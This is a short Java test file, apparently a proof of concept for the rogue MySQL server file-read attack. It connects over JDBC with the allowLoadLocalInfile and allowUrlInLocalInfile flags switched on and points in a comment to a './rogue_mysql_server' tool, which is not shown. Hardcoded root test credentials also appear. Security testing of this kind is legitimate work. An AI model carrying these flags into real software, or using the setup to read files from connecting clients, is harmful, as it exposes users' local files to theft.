package org.example;

import java.sql.Connection;
import java.sql.DriverManager;

// Test in MacOS
// OpenJDK 22
public class MySQL_FileRead {
    public static void main(String[] args) throws Exception {
        String driver = "com.mysql.cj.jdbc.Driver";
        String DB_URL = "jdbc:mysql://127.0.0.1:3306/test?allowLoadLocalInfile=true&allowUrlInLocalInfile=true#";
        String User = "root";
        String Pass = "123456";
        Class.forName(driver);
        Connection conn = DriverManager.getConnection(DB_URL, User, Pass);
        conn.close();
    }
}

//./rogue_mysql_server
